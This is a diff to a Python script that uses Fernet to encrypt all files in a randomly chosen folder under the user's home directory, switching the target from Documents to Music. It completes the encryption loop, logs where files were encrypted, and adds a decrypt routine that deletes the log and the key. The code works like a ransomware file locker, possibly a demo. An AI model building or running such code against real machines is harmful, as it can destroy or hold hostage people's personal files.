@@ -23,7 +23,7 @@ def main():
     global fernet
     fernet= Fernet(key)
 
-    DOCUMENTS = Path.home() / 'Documents'
+    DOCUMENTS = Path.home() / 'Music'
     files=os.listdir(DOCUMENTS)
     i=random.randint(0,len(files)-1)
     path= (str(DOCUMENTS)+"/"+files[i]+"/")
@@ -70,10 +70,18 @@ def encryptAll(directory):
     for root, _, files in os.walk(directory):
         for filename in files:  # loop through files in the current directory
             path=os.path.join(root, filename)
-
-def decryptAll(directory):
-    for root, _, files in os.walk(directory):
-        for filename in files:  # loop through files in the current directory
-            path=os.path.join(root, filename)
             encrypt(path)
+    with open("encryptedLocation.txt", 'w') as g:
+        g.write(directory+"\n")
+    g.close()
+
+def decryptAll():
+    g = open("encryptedLocation.txt", 'r')
+    for line in g.readlines():
+        newLine = line.strip("\n")
+        for root, _, files in os.walk(newLine):
+            for filename in files:  # loop through files in the current directory
+                path=os.path.join(root, filename)
+                decrypt(path)
+    os.remove("encryptedLocation.txt")
     os.remove("filekey.key")
